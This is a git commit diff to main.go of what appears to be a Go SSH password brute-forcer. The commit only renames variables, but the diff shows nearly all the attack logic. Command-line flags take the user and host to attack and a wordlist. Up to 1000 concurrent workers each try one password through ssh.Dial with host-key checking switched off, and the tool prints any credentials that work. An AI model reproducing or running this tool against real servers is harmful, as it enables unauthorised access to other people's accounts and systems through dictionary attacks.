f42fb61b57b14931db68d6ace4ef85a7207da332
vilhelmbergsoe <vilhelmbergsoe@gmail.com>
2020-10-28 16:39:32 +0100

    fixed variable names

--- main.go
+++ main.go
@@ -15,27 +15,27 @@ import (
 
 func main() {
 	var (
-		u  string
-		p  string
-		h  string
-		ps int
+		user     string
+		wordlist string
+		host     string
+		ps       int
 	)
 
-	flag.StringVarP(&u, "user", "u", "", "The user you would like to attack")
-	flag.StringVarP(&p, "wordlist", "w", "", "The wordlist to use for dictionary attack")
-	flag.StringVarP(&h, "host", "h", "", "The host you want to attack. (host:port)")
+	flag.StringVarP(&user, "user", "u", "", "The user you would like to attack")
+	flag.StringVarP(&wordlist, "wordlist", "w", "", "The wordlist to use for dictionary attack")
+	flag.StringVarP(&host, "host", "h", "", "The host you want to attack. (host:port)")
 	flag.IntVarP(&ps, "poolsize", "s", 1000, "How many concurrent workers can run together")
 
 	flag.Parse()
 
 	var wg sync.WaitGroup
 
-	if p == "" {
+	if wordlist == "" {
 		flag.Usage()
 		log.Fatal("flag \"wordlist\" cannot be empty")
 	}
 
-	if u == "" {
+	if user == "" {
 		flag.Usage()
 		log.Fatal("flag \"usage\" cannot be empty")
 	}
@@ -45,15 +45,15 @@ func main() {
 		log.Fatal("flag \"poolsize\" cannot be 0")
 	}
 
-	if h == "" {
+	if host == "" {
 		flag.Usage()
 		log.Fatal("flag \"host\" cannot be empty")
-	} else if !strings.Contains(h, ":") {
+	} else if !strings.Contains(host, ":") {
 		flag.Usage()
 		log.Fatal("flag \"host\" : usage: host:port")
 	}
 
-	file, err := os.Open(p)
+	file, err := os.Open(wordlist)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -72,8 +72,8 @@ func main() {
 			defer wg.Done()
 
 			// fmt.Println("trying password", v)
-			conn, err := ssh.Dial("tcp", h, &ssh.ClientConfig{
-				User:            u,
+			conn, err := ssh.Dial("tcp", host, &ssh.ClientConfig{
+				User:            user,
 				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 				Auth: []ssh.AuthMethod{
 					ssh.Password(v),
@@ -84,7 +84,7 @@ func main() {
 			}
 			conn.Close()
 
-			fmt.Printf("found match for %s: %s:%s\n", h, u, v)
+			fmt.Printf("found match for %s: %s:%s\n", host, user, v)
 		})
 	}
 	if err := scanner.Err(); err != nil {
